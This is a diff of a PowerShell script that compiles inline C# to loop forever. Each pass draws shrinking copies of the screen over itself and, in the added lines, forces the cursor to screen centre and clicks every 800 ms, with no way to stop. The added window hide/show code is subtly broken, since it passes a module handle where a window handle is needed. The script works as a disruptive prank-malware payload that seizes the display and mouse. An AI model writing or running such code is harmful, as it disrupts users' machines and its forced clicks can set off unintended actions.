@@ -1,37 +1,70 @@
- $source= @"
+$source = @"
 using System;
 using System.Runtime.InteropServices;
 using System.Threading;
 
 public static class Win32
 {
- [DllImport("user32.dll")]
- static extern int GetSystemMetrics(int smIndex);
+    [DllImport("user32.dll")]
+    static extern int GetSystemMetrics(int smIndex);
 
- [DllImport("user32.dll")]
- static extern IntPtr GetDC(IntPtr hWnd);
+    [DllImport("user32.dll")]
+    static extern IntPtr GetDC(IntPtr hWnd);
 
- [DllImport("gdi32.dll")]
- static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest,int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, int dwRop);
+    [DllImport("gdi32.dll")]
+    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, int dwRop);
 
- [DllImport("user32.dll", SetLastError = true)]
- static extern bool SetProcessDPIAware();
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern bool SetProcessDPIAware();
 
-public static void PIP()
-{
-SetProcessDPIAware();
-int cx = GetSystemMetrics(0);
-int cy = GetSystemMetrics(1);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
 
-            while(true)
-            {
-                Thread.Sleep(800);
-                IntPtr hdc = GetDC(IntPtr.Zero);
+    [DllImport("user32.dll", CharSet = CharSet.Auto)]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-                StretchBlt(hdc, 50, 50, cx - 100, cy - 100, hdc, 0, 0, cx, cy, 0x00CC0020);
-            }
-}
+    [DllImport("user32.dll")]
+    static extern bool SetForegroundWindow(IntPtr hWnd);
+
+    [DllImport("user32.dll")]
+    static extern bool SetCursorPos(int x, int y);
+
+    [DllImport("user32.dll")]
+    static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
+
+    const int SW_HIDE = 0;
+    const int SW_SHOW = 5;
+    const int MOUSEEVENTF_LEFTDOWN = 0x02;
+    const int MOUSEEVENTF_LEFTUP = 0x04;
+
+    public static void PIP()
+    {
+        SetProcessDPIAware();
+        int cx = GetSystemMetrics(0);
+        int cy = GetSystemMetrics(1);
+
+        while (true)
+        {
+            Thread.Sleep(800);
+            IntPtr hdc = GetDC(IntPtr.Zero);
+
+            StretchBlt(hdc, 50, 50, cx - 100, cy - 100, hdc, 0, 0, cx, cy, 0x00CC0020);
+
+            IntPtr consoleWindow = GetModuleHandle(null);
+            ShowWindow(consoleWindow, SW_HIDE);
+
+            int targetX = cx / 2;
+            int targetY = cy / 2;
+            SetCursorPos(targetX, targetY);
+            mouse_event(MOUSEEVENTF_LEFTDOWN, targetX, targetY, 0, 0);
+            mouse_event(MOUSEEVENTF_LEFTUP, targetX, targetY, 0, 0);
+
+            ShowWindow(consoleWindow, SW_SHOW);
+            SetForegroundWindow(consoleWindow);
+        }
+    }
 }
 "@
- Add-Type -TypeDefinition $source -Language CSharp
- [Win32]::PIP()
+
+Add-Type -TypeDefinition $source -Language CSharp
+[Win32]::PIP()
